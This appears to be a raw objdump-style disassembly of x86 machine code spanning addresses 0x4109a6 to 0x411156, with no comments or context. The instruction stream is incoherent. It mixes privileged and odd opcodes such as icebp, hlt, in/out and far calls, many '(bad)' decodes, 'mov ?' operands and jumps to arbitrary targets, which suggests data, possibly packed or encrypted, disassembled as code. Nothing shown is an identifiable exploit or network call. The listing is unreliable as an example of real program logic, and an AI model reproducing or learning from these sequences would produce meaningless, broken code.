  4109a6:	imul   DWORD PTR [edx]
  4109a8:	sub    edi,0x43e7564e
  4109ae:	jbe    0x4109c6
  4109b0:	inc    ebp
  4109b1:	inc    ecx
  4109b2:	xlat   BYTE PTR ds:[ebx]
  4109b3:	pusha  
  4109b4:	imul   edx,DWORD PTR [ecx-0x468a7c09],0xda5892e8
  4109be:	bound  ecx,QWORD PTR [edi+0x6e]
  4109c1:	mov    edx,0x68c1b4ee
  4109c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c7:	lods   al,BYTE PTR ds:[esi]
  4109c8:	sub    ebx,DWORD PTR [eax+0x3aad784d]
  4109ce:	stos   BYTE PTR es:[edi],al
  4109cf:	xor    DWORD PTR [edi-0x42],0xfffffff5
  4109d3:	es cmp ebp,esi
  4109d6:	ins    DWORD PTR es:[edi],dx
  4109d7:	add    esi,0xfffffff9
  4109da:	imul   edx,DWORD PTR [ecx+0x2c7738dd],0x71a6ad9e
  4109e4:	adc    ch,al
  4109e6:	push   edi
  4109e7:	push   0x62
  4109e9:	imul   ecx,ebx,0x8ef93b17
  4109ef:	and    esp,DWORD PTR [ebx]
  4109f1:	push   0x1864eb05
  4109f6:	push   ss
  4109f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109f8:	into   
  4109f9:	div    BYTE PTR [esi+0x37926f1b]
  4109ff:	lahf   
  410a00:	fs and al,0x75
  410a03:	sar    BYTE PTR [ebp+0x45bc115],0xba
  410a0a:	dec    edx
  410a0b:	mov    ds:0x1b4e7306,al
  410a10:	cmp    al,BYTE PTR [edi+ebx*4]
  410a13:	icebp  
  410a14:	adc    ecx,DWORD PTR [eax]
  410a16:	cmp    eax,0x1c666b0c
  410a1b:	jb     0x410a03
  410a1d:	sbb    al,dh
  410a1f:	fdiv   DWORD PTR [ebp+0x74e139f2]
  410a25:	and    eax,0x9ce223b0
  410a2a:	leave  
  410a2b:	icebp  
  410a2c:	xchg   ebx,eax
  410a2d:	into   
  410a2e:	mov    eax,0xc093fbc5
  410a33:	xchg   ebp,eax
  410a34:	(bad)  
  410a35:	hlt    
  410a36:	int    0xfe
  410a38:	adc    ecx,edx
  410a3a:	or     eax,0xfa2609e8
  410a3f:	fcomp  DWORD PTR [eax-0x1b3e2d30]
  410a45:	adc    bl,BYTE PTR [ebx+edx*4+0x6c6ff48]
  410a4c:	sar    BYTE PTR [eax-0x8d66e9e],0x81
  410a53:	arpl   WORD PTR [edx+ecx*2],bp
  410a56:	fldcw  WORD PTR [ebp+esi*2+0x22a4dc3f]
  410a5d:	dec    eax
  410a5e:	push   edi
  410a5f:	(bad)  
  410a60:	shl    bl,1
  410a62:	pop    ss
  410a63:	fcom   DWORD PTR [esi+0x616be955]
  410a69:	cld    
  410a6a:	je     0x410a81
  410a6c:	xor    ch,bl
  410a6e:	leave  
  410a6f:	jns    0x410a2e
  410a71:	or     al,0x9
  410a73:	clc    
  410a74:	adc    al,0x22
  410a76:	cwde   
  410a77:	pop    eax
  410a78:	mov    dl,0xfe
  410a7a:	pop    ebx
  410a7b:	mov    bh,0x3c
  410a7d:	dec    esi
  410a7e:	sar    DWORD PTR [ecx+0x33],cl
  410a81:	scas   al,BYTE PTR es:[edi]
  410a82:	loopne 0x410a4d
  410a84:	mov    ds:0x5f4a615f,eax
  410a89:	cwde   
  410a8a:	push   ebx
  410a8b:	call   0x2bfef46d
  410a90:	inc    esi
  410a91:	pop    ss
  410a92:	add    eax,0x300899cf
  410a97:	jns    0x1c04dfc1
  410a9d:	les    ebp,FWORD PTR [eax]
  410a9f:	or     eax,0xd9ff12bf
  410aa4:	xor    eax,0xea973bd0
  410aa9:	or     eax,edx
  410aab:	xchg   ecx,eax
  410aac:	test   ch,al
  410aae:	ret    
  410aaf:	push   0xe26d5492
  410ab4:	jg     0x410a52
  410ab6:	inc    esp
  410ab7:	add    eax,0xe3eb4698
  410abc:	mov    ebx,0x1685206f
  410ac1:	fwait
  410ac2:	popf   
  410ac3:	add    ebx,DWORD PTR ds:0xa7eef465
  410ac9:	jae    0x410ac5
  410acb:	sub    ch,BYTE PTR [edx+eax*1]
  410ace:	hlt    
  410acf:	pop    es
  410ad0:	xor    DWORD PTR [ebx+0x4a839281],0xffffff87
  410ad7:	cmp    BYTE PTR [edi+0x66],bh
  410ada:	cmp    DWORD PTR [ebx],esp
  410adc:	push   0xabf99188
  410ae1:	pop    edx
  410ae2:	stos   BYTE PTR es:[edi],al
  410ae3:	popa   
  410ae4:	adc    eax,0xed633018
  410ae9:	test   eax,0xc9d87988
  410aee:	in     eax,0xa5
  410af0:	loope  0x410b44
  410af2:	mov    cl,0x73
  410af4:	fidiv  WORD PTR [edi]
  410af6:	aas    
  410af7:	(bad)  
  410af8:	out    0xd6,al
  410afa:	shr    cl,1
  410afc:	jno    0x410b47
  410afe:	sar    BYTE PTR [esi],0x49
  410b01:	jnp    0x410b19
  410b03:	gs inc esi
  410b05:	fcom   QWORD PTR [esi+ebx*2]
  410b08:	call   0xb122:0x5d82f660
  410b0f:	inc    ebp
  410b10:	mov    bl,0x89
  410b12:	retf   
  410b13:	in     al,dx
  410b14:	dec    esi
  410b15:	fisubr DWORD PTR [esi]
  410b17:	xchg   esi,eax
  410b18:	cli    
  410b19:	mov    ds:0x86a0277,eax
  410b1e:	sar    DWORD PTR ds:0x118e4632,cl
  410b24:	jo     0x410b0c
  410b26:	rol    BYTE PTR [ebx],0xe1
  410b29:	and    eax,0xa8aa4a15
  410b2e:	ret    0xfd8a
  410b31:	dec    esp
  410b32:	mov    dl,0x1e
  410b34:	loopne 0x410ad9
  410b36:	jecxz  0x410af7
  410b38:	adc    bl,BYTE PTR [ebp+0x22]
  410b3b:	in     eax,dx
  410b3c:	daa    
  410b3d:	int    0x4d
  410b3f:	inc    ebx
  410b40:	jmp    0x410b2d
  410b42:	(bad)  
  410b43:	clc    
  410b44:	mov    dl,0xa1
  410b46:	pushf  
  410b47:	adc    DWORD PTR [esi],ebx
  410b49:	sbb    DWORD PTR [edi-0x4aa4e7b3],0xa1188ae3
  410b53:	icebp  
  410b54:	sbb    ch,BYTE PTR [esi]
  410b56:	dec    ebx
  410b57:	bound  ebp,QWORD PTR [edx-0x6973e30f]
  410b5d:	jge    0x410b55
  410b5f:	repnz cmc 
  410b61:	fsub   QWORD PTR [esi]
  410b63:	or     esi,DWORD PTR ds:0x590b56f1
  410b69:	aam    0x1a
  410b6b:	mov    dl,cl
  410b6d:	mov    esi,0x9258fef
  410b72:	test   eax,0x33044430
  410b77:	pusha  
  410b78:	aad    0xfe
  410b7a:	popa   
  410b7b:	adc    eax,0x98069483
  410b80:	pop    ss
  410b81:	dec    ebp
  410b82:	mov    al,ds:0xbf361982
  410b87:	std    
  410b88:	mov    ?,esp
  410b8a:	sub    BYTE PTR [edx],ch
  410b8c:	push   cs
  410b8d:	out    dx,eax
  410b8e:	stos   DWORD PTR es:[edi],eax
  410b8f:	mov    ah,0xd4
  410b91:	pop    esi
  410b92:	push   edi
  410b93:	fsubr  QWORD PTR [esi+0x56]
  410b96:	xlat   BYTE PTR ds:[ebx]
  410b97:	retf   0x658e
  410b9a:	cmp    DWORD PTR [edx-0x14],0x48
  410b9e:	add    al,0x3a
  410ba0:	dec    edi
  410ba1:	or     ebp,DWORD PTR [edx]
  410ba3:	xchg   esi,eax
  410ba4:	scas   al,BYTE PTR es:[edi]
  410ba5:	xchg   BYTE PTR [eax],cl
  410ba7:	iret   
  410ba8:	jne    0x410b4e
  410baa:	retf   0x1f73
  410bad:	xor    DWORD PTR [ebp+0x63f39128],eax
  410bb3:	or     cl,BYTE PTR ds:0x7da813af
  410bb9:	push   ebp
  410bba:	(bad)  
  410bbb:	xor    ah,bl
  410bbd:	mov    fs,WORD PTR [eax-0x5ad88e28]
  410bc3:	fst    QWORD PTR [edx-0x54697b82]
  410bc9:	mov    bl,0xa3
  410bcc:	gs push esi
  410bce:	lds    esp,FWORD PTR [edi]
  410bd0:	xchg   esp,eax
  410bd1:	pop    eax
  410bd2:	mov    al,ds:0x3a881aa1
  410bd7:	lds    ebp,FWORD PTR [eax-0x67]
  410bda:	push   es
  410bdb:	stc    
  410bdc:	push   0x6214d120
  410be1:	jno    0x410bb4
  410be3:	add    eax,0x41fe99d0
  410be8:	daa    
  410be9:	dec    ebx
  410bea:	or     BYTE PTR [edi-0x5b68ed7d],0x77
  410bf1:	hlt    
  410bf2:	fdiv   DWORD PTR [edi+eiz*2]
  410bf5:	outs   dx,DWORD PTR ds:[esi]
  410bf6:	sar    BYTE PTR [ecx-0x4a],cl
  410bf9:	pop    ecx
  410bfa:	xor    DWORD PTR [ebx-0x3c],0xffffffc3
  410bfe:	adc    DWORD PTR [edx-0x24],ebx
  410c01:	pop    DWORD PTR [edi]
  410c03:	xlat   BYTE PTR ds:[ebx]
  410c04:	dec    eax
  410c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c06:	xor    al,0x6f
  410c08:	imul   eax,eax,0xd10d27f1
  410c0e:	into   
  410c0f:	lds    ebp,FWORD PTR [eax+edx*4-0x62]
  410c13:	inc    edi
  410c14:	fild   WORD PTR [ebp+0x1b12ba5]
  410c1a:	cmc    
  410c1b:	mov    al,0x97
  410c1d:	cwde   
  410c1e:	push   ebx
  410c1f:	cmc    
  410c20:	sub    BYTE PTR [eiz*4-0x1f06f064],0xea
  410c28:	and    cl,al
  410c2a:	mov    al,ds:0x59a8499d
  410c2f:	xor    eax,0xa1b36d27
  410c34:	jg     0x410bbd
  410c36:	div    eax
  410c38:	inc    ecx
  410c39:	popf   
  410c3a:	mov    edx,DWORD PTR [edi-0x7f]
  410c3d:	or     esi,esp
  410c3f:	lea    esi,[edx]
  410c41:	not    bh
  410c43:	xchg   edx,eax
  410c44:	xchg   ecx,eax
  410c45:	(bad)  
  410c46:	xchg   edi,eax
  410c47:	push   ecx
  410c48:	iret   
  410c49:	sbb    ch,cl
  410c4b:	xor    al,0x20
  410c4d:	jle    0x410c9e
  410c4f:	push   0xbfb1bf7b
  410c54:	fild   QWORD PTR [ecx-0x6]
  410c57:	stos   BYTE PTR es:[edi],al
  410c58:	jle    0x410cd6
  410c5a:	out    dx,al
  410c5b:	xchg   bx,ax
  410c5d:	jecxz  0x410cdb
  410c5f:	mov    al,0xf1
  410c61:	es cdq 
  410c63:	stos   BYTE PTR es:[edi],al
  410c64:	dec    ecx
  410c65:	aad    0x9
  410c67:	push   0x23
  410c69:	mov    ebx,0x8efc90b0
  410c6e:	mov    ds,WORD PTR [eax+0x3679de2]
  410c74:	test   DWORD PTR [edi+0x2a7f00a9],esi
  410c7a:	and    eax,0xe4fa51d8
  410c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c80:	dec    ebx
  410c81:	push   edi
  410c82:	push   ebx
  410c83:	fisttp DWORD PTR [ebx-0x57ca3279]
  410c89:	jbe    0x410c2d
  410c8b:	hlt    
  410c8c:	pop    edx
  410c8d:	push   esi
  410c8e:	push   cs
  410c8f:	add    al,0xe3
  410c91:	shr    DWORD PTR ds:0x4cf84457,1
  410c97:	popa   
  410c98:	popf   
  410c99:	mov    bl,0x3d
  410c9b:	outs   dx,BYTE PTR ds:[esi]
  410c9c:	stos   DWORD PTR es:[edi],eax
  410c9d:	out    0xf4,al
  410c9f:	pusha  
  410ca0:	push   ecx
  410ca1:	mov    ebp,0x9b5bf7b4
  410ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca8:	test   esp,0xd7295f4f
  410cae:	jns    0x410c9b
  410cb0:	cwde   
  410cb1:	dec    ebp
  410cb2:	inc    ebp
  410cb3:	pushf  
  410cb4:	dec    eax
  410cb5:	sti    
  410cb6:	or     DWORD PTR [ecx],ebx
  410cb8:	cmc    
  410cb9:	sqrtps xmm3,xmm2
  410cbc:	inc    ebx
  410cbd:	js     0x410d3a
  410cbf:	mov    ecx,0x43c2b071
  410cc4:	xchg   esi,edx
  410cc6:	jle    0x410cc2
  410cc8:	sbb    dl,BYTE PTR [edi]
  410cca:	hlt    
  410ccb:	jo     0x410d1c
  410ccd:	sti    
  410cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ccf:	arpl   WORD PTR [edi-0xc],dx
  410cd2:	xor    BYTE PTR [eax],cl
  410cd4:	(bad)  
  410cd5:	scas   eax,DWORD PTR es:[edi]
  410cd6:	adc    al,0xb9
  410cd8:	(bad)  
  410cd9:	loope  0x410d3e
  410cdb:	jo     0x410d1d
  410cdd:	xchg   BYTE PTR [edi+0x4f1e56a0],bh
  410ce3:	nop
  410ce4:	loopne 0x410cc6
  410ce6:	add    al,0xe8
  410ce8:	pop    es
  410ce9:	pop    ebp
  410cea:	or     eax,0xf74e8050
  410cef:	fld    QWORD PTR [ebx]
  410cf1:	mov    esp,0x1ad101d1
  410cf6:	out    0xe0,al
  410cf8:	add    edx,DWORD PTR [edx+0x50e87f5f]
  410cfe:	addr16 dec edi
  410d00:	fbstp  TBYTE PTR [edi-0x2d]
  410d03:	mov    dh,0xf0
  410d05:	in     eax,0x26
  410d07:	and    BYTE PTR [ecx+esi*1+0x52df0bae],ah
  410d0e:	cld    
  410d0f:	ss lahf 
  410d11:	mov    ?,ebx
  410d13:	mov    ch,0xf4
  410d15:	jbe    0x410d71
  410d17:	dec    edx
  410d18:	cmc    
  410d19:	(bad)  
  410d1a:	push   eax
  410d1b:	jnp    0x410d7c
  410d1d:	call   0x25b0:0xbc252ce3
  410d24:	add    eax,0xb224f406
  410d29:	pop    eax
  410d2a:	(bad)  
  410d2b:	jge    0x410d6f
  410d2d:	xchg   edi,eax
  410d2e:	mov    DWORD PTR [ebx+0x5ebfbe0b],edx
  410d34:	in     al,0x6f
  410d36:	push   eax
  410d37:	cwde   
  410d38:	rol    edi,0x35
  410d3b:	jno    0x410d95
  410d3d:	fs jp  0x410d7d
  410d40:	sub    DWORD PTR [ecx+0x39],ebp
  410d43:	and    esi,DWORD PTR [edx]
  410d45:	and    al,cl
  410d47:	and    DWORD PTR [edi+0x4a],esi
  410d4a:	lock ret 
  410d4c:	xor    BYTE PTR [edi-0x24],bh
  410d4f:	push   es
  410d50:	ins    BYTE PTR es:[edi],dx
  410d51:	add    al,ch
  410d53:	xchg   edx,eax
  410d54:	inc    edi
  410d55:	inc    edx
  410d56:	sbb    DWORD PTR [ebp+0x75],ecx
  410d59:	ja     0x410d98
  410d5b:	jge    0x410cf5
  410d5d:	xor    DWORD PTR [eax],0xc
  410d60:	add    al,0xba
  410d62:	inc    ebp
  410d63:	mov    ah,0xbf
  410d65:	(bad)  
  410d66:	aas    
  410d67:	cdq    
  410d68:	into   
  410d69:	xor    DWORD PTR [eax],esi
  410d6b:	adc    eax,0x26dd12e0
  410d70:	pop    esi
  410d71:	add    BYTE PTR [esi],dl
  410d73:	xor    DWORD PTR [edi-0x5f],esp
  410d76:	daa    
  410d77:	xchg   ecx,eax
  410d78:	add    ah,0x26
  410d7b:	into   
  410d7c:	push   0x60969f4e
  410d81:	stos   BYTE PTR es:[edi],al
  410d82:	enter  0xcdf,0xc8
  410d86:	fwait
  410d87:	fs mov esp,0x34eff7d7
  410d8d:	cmp    BYTE PTR [edi],dh
  410d8f:	pop    edi
  410d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d91:	xchg   DWORD PTR [ecx],ecx
  410d93:	not    DWORD PTR [esi]
  410d95:	(bad)  
  410d96:	pop    ebx
  410d97:	mov    ecx,0xca28f1d4
  410d9c:	pop    edi
  410d9d:	test   eax,0x29f34254
  410da2:	push   0xeb891bb8
  410da7:	adc    BYTE PTR [ebx],0x37
  410daa:	sub    eax,0xb1d80c51
  410daf:	mov    DWORD PTR [esi],ebx
  410db1:	or     BYTE PTR [ecx],bh
  410db3:	jg     0x410d65
  410db5:	std    
  410db6:	and    al,0x45
  410db8:	add    dl,BYTE PTR [edi-0x3c]
  410dbb:	retf   0x221e
  410dbe:	hlt    
  410dbf:	out    0xf4,eax
  410dc1:	out    0x7d,al
  410dc3:	retf   
  410dc4:	fstp   DWORD PTR [edx+0x5b31a246]
  410dca:	adc    eax,0x99351b7c
  410dcf:	ss push cs
  410dd1:	fs mov ebx,0x467adebb
  410dd7:	jnp    0x410da2
  410dd9:	mov    dh,0xba
  410ddb:	adc    eax,0x804cdec3
  410de0:	mov    gs,WORD PTR [ebx+0x38]
  410de3:	mov    ebx,0xf3fbded9
  410de8:	ror    bl,1
  410dea:	dec    ebx
  410deb:	adc    DWORD PTR [edi],edx
  410ded:	sub    ebp,ebp
  410def:	aad    0x6e
  410df1:	and    eax,0xeba3d66e
  410df6:	adc    eax,0x220facfa
  410dfb:	retf   0x22c9
  410dfe:	sbb    DWORD PTR [ecx-0x58],0xfffffff1
  410e02:	pushf  
  410e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e04:	sti    
  410e05:	inc    ecx
  410e06:	mov    ecx,DWORD PTR [esp+ebx*2]
  410e09:	fisttp QWORD PTR [ecx-0xceb96a2]
  410e0f:	cmp    dl,BYTE PTR [edx+0x3a]
  410e12:	fldcw  WORD PTR [ecx+0x3f]
  410e15:	xchg   BYTE PTR [edi],ah
  410e17:	out    0xdd,eax
  410e19:	and    al,0xaa
  410e1b:	rcr    ch,1
  410e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e1e:	(bad)
  410e22:	cdq    
  410e23:	loop   0x410e90
  410e25:	pop    ebx
  410e26:	inc    ebx
  410e27:	leave  
  410e28:	test   DWORD PTR [ecx+0xdfddc57],edx
  410e2e:	test   BYTE PTR [ebp+0x4d964087],al
  410e34:	mov    dl,BYTE PTR [esi+edx*8-0x6008f132]
  410e3b:	pop    ebp
  410e3c:	sbb    edi,DWORD PTR [ebp-0x290bdf40]
  410e42:	xchg   edx,eax
  410e43:	in     eax,0xf4
  410e45:	loopne 0x410e3c
  410e47:	sub    eax,0x1c1160cf
  410e4c:	or     al,0x9c
  410e4e:	push   eax
  410e4f:	aam    0x1e
  410e51:	jg     0x410dfd
  410e53:	sbb    BYTE PTR [edx],dh
  410e55:	jae    0x410df6
  410e57:	jp     0x410ed8
  410e59:	ror    BYTE PTR [ebx-0x67d1d06f],cl
  410e5f:	xchg   ebx,eax
  410e60:	std    
  410e61:	pop    esp
  410e62:	mov    ah,0x24
  410e64:	lods   eax,DWORD PTR ds:[esi]
  410e65:	adc    DWORD PTR [ebx],ecx
  410e67:	sahf   
  410e68:	mov    eax,0x3ca3e2da
  410e6d:	(bad)  
  410e70:	lods   eax,DWORD PTR ds:[esi]
  410e71:	repnz and al,0x9c
  410e74:	and    esi,ebp
  410e76:	inc    esp
  410e77:	popf   
  410e78:	inc    esi
  410e79:	sbb    BYTE PTR [esp+edi*1],0x67
  410e7d:	repz mov ebx,0x12689a8c
  410e83:	mov    ebx,edx
  410e85:	stc    
  410e86:	mov    DWORD PTR [edi-0xb],ecx
  410e89:	mov    bl,0xb5
  410e8c:	mov    cs,WORD PTR [ecx+0x1da24388]
  410e92:	pop    ebx
  410e93:	mov    edi,0x9e45a6e1
  410e98:	jl     0x410e35
  410e9a:	add    al,BYTE PTR [edi]
  410e9c:	mov    bl,0x5c
  410e9e:	cmp    edx,ecx
  410ea0:	mov    dh,0xd1
  410ea2:	mov    eax,DWORD PTR [edi+ebx*8]
  410ea5:	mov    ebp,0x6124c795
  410eaa:	xchg   ebp,eax
  410eab:	cmp    BYTE PTR [eax+0x66],0x39
  410eaf:	and    dh,al
  410eb1:	xor    DWORD PTR [ebx-0x272391e3],0x58
  410eb8:	and    DWORD PTR [eax-0x4b],0x65
  410ebc:	inc    ecx
  410ebd:	ja     0x410f2c
  410ebf:	pop    esi
  410ec0:	cmp    al,0xc4
  410ec2:	aaa    
  410ec3:	mov    ?,WORD PTR [ebp+ecx*4-0x2759d4df]
  410eca:	jl     0x410f0d
  410ecc:	mov    ch,0x73
  410ece:	inc    esp
  410ecf:	(bad)  
  410ed0:	ja     0x410f0c
  410ed2:	pop    ss
  410ed3:	add    al,0xaf
  410ed6:	push   ecx
  410ed7:	loope  0x410ed7
  410ed9:	mov    edi,0xa7da8a23
  410ede:	add    al,0x48
  410ee0:	cmp    al,0x0
  410ee2:	sub    DWORD PTR [eax+esi*4],eax
  410ee5:	in     eax,dx
  410ee6:	xchg   ebp,eax
  410ee7:	(bad)  
  410ee8:	sti    
  410ee9:	jmp    DWORD PTR [esi+0x6ca81998]
  410eef:	jp     0x410ec4
  410ef1:	and    bh,BYTE PTR [ebx+0x7d]
  410ef4:	push   0xd1aad219
  410ef9:	sbb    al,0xdd
  410efb:	mov    ds:0x298e820d,eax
  410f00:	repnz call 0x2354:0xc975e79d
  410f08:	cmp    BYTE PTR [eax],ch
  410f0a:	stos   DWORD PTR es:[edi],eax
  410f0b:	clc    
  410f0c:	pop    ecx
  410f0d:	jle    0x410ee8
  410f0f:	ds scas eax,DWORD PTR es:[edi]
  410f11:	push   es
  410f12:	mov    al,ds:0x525baabc
  410f17:	pop    esi
  410f18:	sahf   
  410f19:	cwde   
  410f1a:	cdq    
  410f1b:	xor    eax,0x5d377c51
  410f20:	push   ss
  410f21:	mov    esp,0xa51cc2fc
  410f26:	ss dec eax
  410f28:	sub    eax,0x537ec4e8
  410f2d:	jecxz  0x410ede
  410f2f:	scas   eax,DWORD PTR es:[edi]
  410f30:	or     ah,BYTE PTR [ecx+ebp*2-0x56d841e9]
  410f37:	in     al,0x2
  410f39:	jae    0x410f7f
  410f3b:	push   esi
  410f3c:	mov    eax,0xecd86e4b
  410f41:	inc    esi
  410f42:	pop    ds
  410f43:	shl    DWORD PTR [eax-0x49],0xb7
  410f47:	dec    eax
  410f48:	lock fwait
  410f4a:	sbb    DWORD PTR [edi+0x41a874e6],esi
  410f50:	mov    ds:0x94e4df0a,al
  410f55:	mov    BYTE PTR [edi+0x120459ab],ch
  410f5b:	daa    
  410f5c:	scas   al,BYTE PTR es:[edi]
  410f5d:	in     al,0x5f
  410f5f:	and    al,0x69
  410f61:	pop    esp
  410f62:	jp     0x410f49
  410f64:	pop    ebx
  410f65:	push   ebx
  410f66:	js     0x410f39
  410f68:	xor    eax,0xab8a1c0d
  410f6d:	push   es
  410f6e:	mov    WORD PTR ds:0xc82b04f1,cs
  410f74:	add    BYTE PTR es:[esi+eax*8-0x22],ah
  410f79:	mov    DWORD PTR [ebp+edi*2-0x12],edx
  410f7d:	icebp  
  410f7e:	dec    edi
  410f7f:	cld    
  410f80:	(bad)  
  410f82:	aam    0xc2
  410f84:	ret    0xda3d
  410f87:	ficom  DWORD PTR [ecx+esi*8+0x68]
  410f8b:	push   edx
  410f8c:	ror    ecx,cl
  410f8e:	in     al,0x34
  410f90:	jnp    0x410f8b
  410f92:	push   esp
  410f93:	mov    esi,0x8c2d3769
  410f98:	jl     0x410fc4
  410f9a:	idiv   DWORD PTR [ecx+eax*4]
  410f9d:	inc    eax
  410f9e:	mov    esp,0xc8e7d9
  410fa3:	sub    eax,edi
  410fa5:	inc    esi
  410fa6:	std    
  410fa7:	adc    DWORD PTR [ebx+0x1b],esp
  410faa:	xchg   esi,eax
  410fab:	iret   
  410fac:	add    esp,ecx
  410fae:	aas    
  410faf:	out    0xe3,eax
  410fb1:	push   ebp
  410fb2:	mov    eax,ds:0x97a64043
  410fb7:	neg    DWORD PTR [ebx-0x3f]
  410fba:	pop    ebx
  410fbb:	cs scas al,BYTE PTR es:[edi]
  410fbd:	ficomp DWORD PTR [eax+0x32]
  410fc0:	aas    
  410fc1:	ss push cs
  410fc3:	mov    bl,bl
  410fc5:	and    dh,BYTE PTR [eax+0x6b9c441]
  410fcb:	or     DWORD PTR [edx+eiz*2],ebx
  410fce:	lahf   
  410fcf:	cmp    BYTE PTR [edx-0x67],al
  410fd2:	fmul   DWORD PTR [ebx-0x2eed55ca]
  410fd8:	dec    esp
  410fd9:	mov    bh,0x61
  410fdb:	sub    al,BYTE PTR [edi+0x57]
  410fde:	adc    dh,cl
  410fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fe1:	repnz cmc 
  410fe3:	push   es
  410fe4:	xchg   esi,eax
  410fe5:	or     BYTE PTR [ecx],0xdb
  410fe8:	in     eax,dx
  410fe9:	adc    BYTE PTR [eax],bl
  410feb:	add    DWORD PTR [edi],eax
  410fed:	and    ah,BYTE PTR [ecx-0xbab7462]
  410ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ff4:	or     eax,ecx
  410ff6:	xchg   ebx,eax
  410ff7:	ja     0x41101b
  410ff9:	(bad)  
  410ffa:	push   ebp
  410ffb:	scas   al,BYTE PTR es:[edi]
  410ffc:	push   edi
  410ffd:	std    
  410ffe:	xor    ch,BYTE PTR [ebp+eax*2+0x4eb04af1]
  411005:	pop    eax
  411006:	dec    esi
  411007:	or     BYTE PTR [edi-0x2e],0x1f
  41100b:	jmp    0xff28b8e4
  411010:	and    cl,dl
  411012:	hlt    
  411013:	or     al,0x53
  411015:	in     al,0x6f
  411017:	cmp    al,0x26
  411019:	pop    esp
  41101a:	out    0xa5,al
  41101c:	lds    esi,FWORD PTR [esi+0x46]
  41101f:	inc    edi
  411020:	cmp    eax,0xd04d0cd7
  411025:	xor    ah,ch
  411027:	mov    dh,0x5c
  411029:	das    
  41102a:	adc    eax,0xb9993385
  41102f:	mov    al,ds:0x237d7df2
  411034:	fs adc al,0xde
  411037:	leave  
  411038:	std    
  411039:	dec    edi
  41103a:	mov    cl,0x9f
  41103c:	sti    
  41103d:	mov    edi,0xb7415179
  411042:	jl     0x410fc4
  411044:	mov    bh,0x43
  411046:	in     al,dx
  411047:	dec    ecx
  411048:	in     al,dx
  411049:	mov    WORD PTR ds:0xf6768fda,?
  41104f:	jmp    0x4110c1
  411051:	mov    ds:0xc5d83edf,eax
  411056:	inc    ecx
  411057:	cmp    edi,DWORD PTR [ebp+0x7a9aa28a]
  41105d:	fldcw  WORD PTR [ecx+edx*4-0x63]
  411061:	sbb    ebx,DWORD PTR [esi+0x33]
  411064:	stos   DWORD PTR es:[edi],eax
  411065:	movhps QWORD PTR cs:[esi+0x1c],xmm4
  41106a:	mov    bl,0x1
  41106c:	rol    dl,0x73
  41106f:	and    al,0xdf
  411071:	cmp    DWORD PTR [bp+si],0xffffffbd
  411075:	popf   
  411076:	pop    es
  411077:	fist   DWORD PTR [ebx-0x34]
  41107a:	jno    0x411072
  41107c:	popa   
  41107d:	cli    
  41107e:	ins    BYTE PTR es:[edi],dx
  41107f:	leave  
  411080:	push   ebx
  411081:	xchg   edi,eax
  411082:	sbb    al,0x61
  411084:	aaa    
  411085:	stos   BYTE PTR es:[edi],al
  411086:	sbb    al,0x5a
  411088:	add    al,0x68
  41108a:	add    ch,0x5d
  41108d:	and    BYTE PTR ds:0x5a2638c3,dl
  411093:	repz push esi
  411095:	ins    DWORD PTR es:[edi],dx
  411096:	es xchg edx,eax
  411098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411099:	lahf   
  41109a:	sub    esi,DWORD PTR [edx]
  41109c:	xchg   BYTE PTR [edx-0x66],ah
  41109f:	or     eax,0x7f3cbae8
  4110a4:	dec    edx
  4110a5:	sub    DWORD PTR [esp+eax*4+0x54d93167],ecx
  4110ac:	ins    DWORD PTR es:[edi],dx
  4110ad:	jg     0x411074
  4110af:	pusha  
  4110b0:	jge    0x4110e3
  4110b2:	push   ebp
  4110b3:	or     BYTE PTR [ecx],0xe8
  4110b6:	mov    ecx,0x75445aaa
  4110bb:	cmp    BYTE PTR ss:[edx-0x39],bl
  4110bf:	test   BYTE PTR [edx-0x58fa5494],dh
  4110c5:	fisttp QWORD PTR [edx-0x31]
  4110c8:	(bad)  
  4110c9:	jb     0x4110b8
  4110cb:	mov    fs,esi
  4110cd:	fld    TBYTE PTR [edi+0x2a61356d]
  4110d3:	lods   al,BYTE PTR ds:[esi]
  4110d4:	hlt    
  4110d5:	mov    esp,DWORD PTR [edx]
  4110d7:	inc    edi
  4110d8:	mov    eax,0x6954849c
  4110dd:	adc    eax,0xfda87c4f
  4110e2:	jl     0x4110d5
  4110e4:	aaa    
  4110e5:	(bad)  
  4110e6:	or     DWORD PTR [esi-0x2b268641],esp
  4110ec:	shl    DWORD PTR [esi-0x28],1
  4110ef:	dec    esi
  4110f0:	and    DWORD PTR gs:[edi-0xd1c2f2e],esp
  4110f7:	xor    cl,BYTE PTR [eax-0x74]
  4110fa:	mov    edx,0xf5dfc83c
  4110ff:	repz and al,0x97
  411102:	paddusb mm6,QWORD PTR [ecx+ebp*1]
  411106:	lahf   
  411107:	mov    dl,0x5
  411109:	push   edx
  41110a:	daa    
  41110b:	sub    DWORD PTR [edi-0x47],eax
  41110e:	test   BYTE PTR [ecx+0x36656dab],al
  411114:	xchg   BYTE PTR [edi+0x5738b89f],ah
  41111a:	leave  
  41111b:	es ss loopne 0x4110fd
  41111f:	lods   al,BYTE PTR ds:[esi]
  411120:	inc    eax
  411121:	lfs    edi,FWORD PTR [edi+0x15faf17e]
  411128:	idiv   DWORD PTR [eax+0x3b]
  41112b:	les    edx,FWORD PTR [eax+0x123d537]
  411131:	xchg   esi,eax
  411132:	sub    dl,cl
  411134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411135:	mov    DWORD PTR [edi],eax
  411137:	cmp    bh,BYTE PTR [eax+0x41]
  41113a:	fcomp  st(0)
  41113c:	rol    DWORD PTR [edx+0x1ebfb923],1
  411142:	gs inc ebp
  411144:	sbb    al,0x96
  411146:	dec    edx
  411147:	loope  0x4110ca
  411149:	inc    esp
  41114a:	adc    eax,0x28b435fd
  41114f:	push   ebx
  411150:	push   ecx
  411151:	add    eax,0x859c8e2e
  411156:	mov    bl,0xc6
